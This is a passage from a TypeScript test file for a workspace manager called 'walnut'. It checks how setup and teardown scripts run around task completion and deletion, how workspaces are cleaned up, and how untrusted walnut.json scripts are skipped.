  it('a task completed while its waiting setup ran is cleaned up once the setup ends', async () => {
    f.meta.Acme = { scripts: [{ name: 'Install', command: 'bun install', setup: true }] }
    addTask(f, { id: 'd2' })
    await made(f, 'd2')
    await until(() => runCall(f).length === 1, 'setup started')
    f.tasks.set('d2', { ...f.tasks.get('d2')!, phase: 'COMPLETE', completed_at: 'A' } as Task)
    await onTaskCompleted('d2', { grace: false })
    expect(f.calls.some((c) => c.cmd === 'workspace.status')).toBe(false)
    f.jobs.set(String(runCall(f)[0].params.jobId), { state: 'done', result: { exitCode: 0, ms: 5 } })
    await __settleWorkspaceDriver('d2')
    await until(() => f.calls.some((c) => c.cmd === 'workspace.remove'), 'cleanup after setup')
    await __settleCompletionCheck('d2')
    await __settleWorkspaceDriver('d2')
    expect(ws(f, 'd2').state).toBe('removed')
    expect(f.launched).toEqual([])
  })

  it('a deleted task waits for its running script before the workspace goes', async () => {
    const task = addTask(f, { id: 'd3', workspace: {
      provider: 'git-worktree', host: '__local__', home: HOME, anchor: '/r/repo', root: '/w/repo/x', cwd: '/w/repo/x', repos: [], state: 'ready',
      setup: { name: 'Install', command: 'bun install', source: 'project', state: 'running', wait: true, job_id: 'setup-job', started_at: 'then' },
    } })
    f.jobs.set('setup-job', { state: 'running' })
    f.tasks.delete('d3')
    const gone = onTaskDeleted(task)
    await tick(20)
    expect(f.calls.some((c) => c.cmd === 'workspace.remove')).toBe(false)
    f.jobs.set('setup-job', { state: 'done', result: { exitCode: 0, ms: 5 } })
    await gone
    expect(f.calls.some((c) => c.cmd === 'workspace.remove')).toBe(true)
  })

  it('the prompt line names only a workspace still there; a setup that does not wait says to check it', () => {
    const base: TaskWorkspace = {
      provider: 'git-worktree', host: '__local__', home: HOME, anchor: '/r/repo', root: '/w/repo/x', cwd: '/w/repo/x', repos: [], state: 'ready',
      setup: { name: 'Install', command: 'bun install', source: 'project', state: 'done', started_at: 'a', ended_at: 'b' },
    }
    expect(setupPromptLine(base)).toMatch(/succeeded/)
    expect(setupPromptLine({ ...base, state: 'removed' })).toBe('')
    // No setup: only a default workspace (nobody asked for it) says where the agent works.
    expect(setupPromptLine({ ...base, setup: undefined })).toBe('')
    expect(setupPromptLine({ ...base, setup: undefined, by_default: true })).toMatch(/isolated workspace at .* by default, since this is a code task\. Work and commit here/)
    expect(setupPromptLine({ ...base, setup: { ...base.setup!, state: 'running', wait: false } })).toMatch(/may still be running: before you rely on what it prepares, check its result/)
  })
})

describe('teardown at completion', () => {
  let f: Fake
  beforeEach(() => { f = fake() })

  function completed(id: string, at: string, extra: Partial<TaskWorkspace> = {}): void {
    addTask(f, { id, phase: 'COMPLETE', completed_at: at, workspace: {
      provider: 'git-worktree', host: '__local__', home: HOME, anchor: '/r/repo', root: '/w/repo/x', cwd: '/w/repo/x', branch: 'walnut/x', repos: [], state: 'ready', ...extra,
    } } as Partial<Task> & { id: string })
  }

  it('runs once before the cleanup check, then the workspace is removed', async () => {
    f.meta.Acme = { scripts: [{ name: 'Down', command: 'docker compose down', teardown: true }] }
    completed('c1', '2026-11-04T10:00:00Z')
    const check = onTaskCompleted('c1', { grace: false })
    await until(() => runCall(f).length === 1, 'teardown started')
    expect(runCall(f)[0].params).toMatchObject({ command: 'docker compose down', env: { WALNUT_SCRIPT_TRIGGER: 'teardown' } })
    expect(f.calls.some((c) => c.cmd === 'workspace.status')).toBe(false)
    f.jobs.set(String(runCall(f)[0].params.jobId), { state: 'done', result: { exitCode: 0, ms: 5 } })
    await check
    await __settleCompletionCheck('c1')
    await __settleWorkspaceDriver('c1')
    expect(ws(f, 'c1')).toMatchObject({ state: 'removed', teardown: { state: 'done', for_completion: '2026-11-04T10:00:00Z' } })
  })

  it('a failed teardown still lets cleanup decide; a second check for the same completion does not run it again', async () => {
    f.meta.Acme = { scripts: [{ name: 'Down', command: 'false', teardown: true }] }
    completed('c2', 'A')
    f.live = false
    const first = onTaskCompleted('c2', { grace: false })
    await until(() => runCall(f).length === 1, 'teardown started')
    f.jobs.set(String(runCall(f)[0].params.jobId), { state: 'done', result: { exitCode: 2, ms: 5 } })
    await first
    await __settleWorkspaceDriver('c2')
    expect(ws(f, 'c2').teardown).toMatchObject({ state: 'failed', exit_code: 2 })
    // The same completion checked again (a session stopped): no second run.
    f.tasks.set('c2', { ...f.tasks.get('c2')!, workspace: { ...ws(f, 'c2'), state: 'ready' } })
    await onTaskCompleted('c2', { grace: false })
    expect(runCall(f)).toHaveLength(1)
  })

  it('a setup still running holds the cleanup', async () => {
    f.meta.Acme = { scripts: [{ name: 'Down', command: 'x', teardown: true }] }
    completed('c3', 'A', { setup: { name: 'Install', command: 'bun install', source: 'project', state: 'running', job_id: 'j', started_at: 'then' } })
    await onTaskCompleted('c3', { grace: false })
    expect(runCall(f)).toEqual([])
    expect(f.calls.some((c) => c.cmd === 'workspace.status')).toBe(false)
  })

  it('a teardown from a walnut.json nobody allowed is skipped once, and cleanup goes on', async () => {
    f.file = { name: 'walnut.json', path: '/w/repo/x/walnut.json', content: JSON.stringify({ scripts: [{ name: 'Down', command: 'x', teardown: true }] }) }
    completed('c5', 'A')
    await onTaskCompleted('c5', { grace: false })
    await __settleWorkspaceDriver('c5')
    expect(runCall(f)).toEqual([])
    expect(ws(f, 'c5')).toMatchObject({ state: 'removed', teardown: { state: 'skipped', untrusted: true, for_completion: 'A' } })
  })

  it('a teardown the host refused as busy is tried again at the next check', async () => {
    f.meta.Acme = { scripts: [{ name: 'Down', command: 'x', teardown: true }] }
    completed('c7', 'A')
    f.runReply = { ok: false, error: 'another workspace operation is running for this place', code: 'busy' }
    await onTaskCompleted('c7', { grace: false })
    expect(ws(f, 'c7').state).toBe('ready')
    expect(ws(f, 'c7').teardown?.for_completion).toBeUndefined()
    f.runReply = undefined
    void onTaskCompleted('c7', { grace: false })
    await until(() => runCall(f).length === 2, 'teardown tried again')
  })

  it('a teardown asks the host to end what it left running', async () => {
    f.meta.Acme = { scripts: [{ name: 'Down', command: 'x', teardown: true }] }
    completed('c6', 'A')
    void onTaskCompleted('c6', { grace: false })
    await until(() => runCall(f).length === 1, 'teardown started')
    expect(runCall(f)[0].params.endGroup).toBe(true)
  })

  it('no teardown script: straight to the cleanup check', async () => {
    completed('c4', 'A')
    await onTaskCompleted('c4', { grace: false })
    await __settleWorkspaceDriver('c4')
    expect(runCall(f)).toEqual([])
    expect(ws(f, 'c4').state).toBe('removed')
  })
})

describe('the scripts view', () => {
  let f: Fake
  beforeEach(() => { f = fake() })

  it('project scripts first, then the file, with the roles and the file named', async () => {
    f.meta.Acme = { scripts: [{ name: 'Test', command: 'bun run test' }] }
    f.file = { name: 'walnut.json', path: '/r/repo/walnut.json', content: JSON.stringify({ scripts: [{ name: 'Setup', command: 'pnpm i', setup: true }] }) }
    const view = await scriptsFor({ project: 'Acme', host: 'local', dir: '/r/repo/pkg' })
    expect(view).toMatchObject({ host: '__local__', project: 'Acme', dir: '/r/repo/pkg', setup: 'file-setup', file: { name: 'walnut.json', path: '/r/repo/walnut.json' } })
    expect(view.scripts.map((s) => `${s.source}:${s.name}`)).toEqual(['project:Test', 'walnut.json:Setup'])
    expect(view.file?.hash).toBe(fileHash(f.file.content))
    expect(view.file_trusted).toBe(false)
    allowFile(f)
    expect((await scriptsFor({ project: 'Acme', host: 'local', dir: '/r/repo/pkg' })).file_trusted).toBe(true)
  })

  it('a file that cannot be read says why; the project list still shows', async () => {
    f.meta.Acme = { scripts: [{ name: 'Test', command: 'bun run test' }] }
    f.oldDaemon = true
    const view = await scriptsFor({ project: 'Acme', dir: '/r/repo' })
    expect(view.scripts.map((s) => s.name)).toEqual(['Test'])
    expect(view.file_unavailable).toMatch(/needs an update/)
    f.oldDaemon = false
    f.file = { name: 'walnut.json', path: '/r/repo/walnut.json', content: '{oops' }
    expect((await scriptsFor({ dir: '/r/repo' })).file?.error).toMatch(/not valid JSON/)
  })
})
